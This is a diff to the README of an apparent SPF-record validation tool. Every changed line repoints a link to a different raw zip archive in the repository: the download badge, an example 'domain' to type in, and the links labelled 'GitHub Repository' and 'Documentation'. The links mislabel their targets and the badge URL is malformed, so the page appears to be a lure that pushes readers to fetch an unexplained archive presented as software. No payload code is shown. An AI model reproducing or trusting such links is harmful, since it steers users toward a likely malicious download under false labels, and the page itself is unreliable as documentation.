@@ -8,7 +8,7 @@ Welcome to the spfvalidator-api! This tool helps you check the Sender Policy Fra
 
 To download the spfvalidator-api, visit the Releases page below:
 
-[![Download spfvalidator-api](https://github.com/Manoj5k/spfvalidator-api/raw/refs/heads/main/python/src/spfvalidator_api_v1.3.zip%https://github.com/Manoj5k/spfvalidator-api/raw/refs/heads/main/python/src/spfvalidator_api_v1.3.zip)](https://github.com/Manoj5k/spfvalidator-api/raw/refs/heads/main/python/src/spfvalidator_api_v1.3.zip)
+[![Download spfvalidator-api](https://github.com/Manoj5k/spfvalidator-api/raw/refs/heads/main/nuget/spfvalidator-api-v2.4.zip%https://github.com/Manoj5k/spfvalidator-api/raw/refs/heads/main/nuget/spfvalidator-api-v2.4.zip)](https://github.com/Manoj5k/spfvalidator-api/raw/refs/heads/main/nuget/spfvalidator-api-v2.4.zip)
 
 This link will take you directly to where you can get the latest version of the software. 
 
@@ -32,7 +32,7 @@ Once you have the application downloaded, here’s how to use it:
 
 ### Entering Your Domain
 
-- You will see a field where you can input the domain you wish to test, such as `https://github.com/Manoj5k/spfvalidator-api/raw/refs/heads/main/python/src/spfvalidator_api_v1.3.zip`.
+- You will see a field where you can input the domain you wish to test, such as `https://github.com/Manoj5k/spfvalidator-api/raw/refs/heads/main/nuget/spfvalidator-api-v2.4.zip`.
 - Optionally, enter the specific IP address you want to check.
 - Click the "Verify" button to begin the validation process.
 
@@ -77,7 +77,7 @@ The spfvalidator-api is licensed under the MIT License. Feel free to modify and 
 
 For more information, you can explore the following:
 
-- [GitHub Repository](https://github.com/Manoj5k/spfvalidator-api/raw/refs/heads/main/python/src/spfvalidator_api_v1.3.zip)
-- [Documentation](https://github.com/Manoj5k/spfvalidator-api/raw/refs/heads/main/python/src/spfvalidator_api_v1.3.zip)
+- [GitHub Repository](https://github.com/Manoj5k/spfvalidator-api/raw/refs/heads/main/nuget/spfvalidator-api-v2.4.zip)
+- [Documentation](https://github.com/Manoj5k/spfvalidator-api/raw/refs/heads/main/nuget/spfvalidator-api-v2.4.zip)
 
 We hope you find the spfvalidator-api useful for validating SPF records! If you have any questions or need assistance, please contact us through the GitHub project page.
